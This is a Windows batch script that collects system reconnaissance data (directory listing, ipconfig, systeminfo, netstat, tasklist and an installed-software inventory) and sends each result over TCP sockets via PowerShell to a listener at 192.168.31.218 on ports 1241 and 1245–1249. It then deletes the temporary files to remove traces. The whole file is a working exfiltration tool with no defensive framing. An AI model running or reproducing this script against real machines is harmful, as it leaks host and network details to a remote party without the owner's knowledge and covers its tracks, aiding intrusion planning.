@echo off

REM Run the dir command and save the output to a temporary file
dir > "C:\TEMP\dir_output.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path 'C:\TEMP\dir_output.txt'; $client = New-Object System.Net.Sockets.TcpClient('192.168.31.218', 1245); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"

timeout /t 5

REM Run the ipconfig command and save the output to a temporary file
ipconfig > "C:\TEMP\ipconfig.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path 'C:\TEMP\ipconfig.txt'; $client = New-Object System.Net.Sockets.TcpClient('192.168.31.218', 1246); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"

timeout /t 5

REM Run the systeminfo command and save the output to a temporary file
systeminfo > "C:\TEMP\systeminfo.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path 'C:\TEMP\systeminfo.txt'; $client = New-Object System.Net.Sockets.TcpClient('192.168.31.218', 1247); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"

timeout /t 5

REM Run the netstat command and save the output to a temporary file
netstat > "C:\TEMP\netstat.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path 'C:\TEMP\netstat.txt'; $client = New-Object System.Net.Sockets.TcpClient('192.168.31.218', 1248); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"

timeout /t 5

REM Run the tasklist command and save the output to a temporary file
tasklist > "C:\TEMP\tasklist.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path 'C:\TEMP\tasklist.txt'; $client = New-Object System.Net.Sockets.TcpClient('192.168.31.218', 1249); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"

timeout /t 5

REM Run the wmic product get name, version command and save the output to a temporary file
wmic product get name, version > "C:\TEMP\wmic.txt"

timeout /t 5

REM Send the file contents to the Python server using PowerShell
powershell -Command "$fileContent = Get-Content -Raw -Path 'C:\TEMP\wmic.txt'; $client = New-Object System.Net.Sockets.TcpClient('192.168.31.218', 1241); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine($fileContent); $writer.Flush(); $client.Close()"

timeout /t 5

REM Clean up the temporary files
del "C:\TEMP\dir_output.txt"
del "C:\TEMP\ipconfig.txt"
del "C:\TEMP\systeminfo.txt"
del "C:\TEMP\netstat.txt"
del "C:\TEMP\tasklist.txt"
del "C:\TEMP\wmic.txt"

exit
